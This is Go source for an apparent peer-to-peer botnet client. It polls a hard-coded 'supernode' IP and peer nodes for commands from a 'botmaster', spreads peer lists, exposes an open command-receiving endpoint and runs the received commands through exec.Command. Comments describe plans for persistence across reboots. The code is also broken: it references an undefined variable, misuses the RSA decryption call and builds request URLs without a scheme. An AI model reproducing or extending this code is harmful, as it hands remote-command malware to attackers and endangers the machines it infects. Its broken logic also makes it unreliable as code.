package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/json"
	"net"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

type BotFunc interface {
	Online()
	Supernode()
	InvokeCommand()
}

type Bot struct {
	IP 			 string
	Port         string
	Command      string
	Publickey    string
	Supernodes   map[string]int
	OnlineTicker *time.Ticker
}

type Online struct {
	IP           string         `json:"ip"`
	Command      string         `json:"command"`
	Supernodes   map[string]int `json:"supernodes"`
}

func main() {
	//Public key used to decrypt a command sent from botmaster encrypted with private key
	//Execute Command
	//Turn off http after 15 minutes if not supernode
	//Make persistable across reboots

	bot := Bot{
		Port:         ":8080",
		Command:      "",
		Publickey:    "",
		Supernodes:   map[string]int{"77.88.124.125": 0},
		OnlineTicker: time.NewTicker(5 * time.Minute),
	}
	go bot.Supernode()
	bot.Online()
}

func(b *Bot)Supernode() {
	defer func() {
		recover()
	}()
	http.HandleFunc("/ReceiveCommand/", func(w http.ResponseWriter, r *http.Request) {
		b.Command = strings.TrimPrefix(r.URL.Path, "/ReceiveCommand/")
		json.NewEncoder(w).Encode(true)
	})
	http.HandleFunc("/Online", func(w http.ResponseWriter, r *http.Request) {
		b.IP, _, _ = net.SplitHostPort(r.URL.Host)
		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		if _, value := b.Supernodes[ip]; !value {
			b.Supernodes[ip] = 0
		}
		respBody := Online{
			IP:         ip,
			Command:    b.Command,
			Supernodes: b.Supernodes,
		}
		json.NewEncoder(w).Encode(respBody)
	})
	if err := http.ListenAndServe(b.Port, nil); err != nil {
		panic(err)
	}
}

func(bot *Bot)Online() {
	for {
		for supernode, heartbeat := range bot.Supernodes {
			resp, _ := http.Get(supernode + bot.Port + "/Online")
			if resp.StatusCode != 200 {
				if heartbeat == 2 {
					delete(bot.Supernodes, supernode)
				} else {
					bot.Supernodes[supernode] = heartbeat + 1
				}
			} else {
				var respBody Online
				json.NewDecoder(resp.Body).Decode(&respBody)
				bot.IP = respBody.IP
				bot.Command = respBody.Command
				for newNode, newHeartbeat := range respBody.Supernodes {
					if _, value := bot.Supernodes[newNode]; !value {
						bot.Supernodes[newNode] = newHeartbeat
					}
				}
				resp.Body.Close()
			}
		}
		bot.InvokeCommand()
		<-bot.OnlineTicker.C
	}
}

func(bot *Bot)InvokeCommand() {
	plainTextCommand, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, bot.Publickey, command)
	cmd := exec.Command(string(plainTextCommand))
	cmd.Start()
}
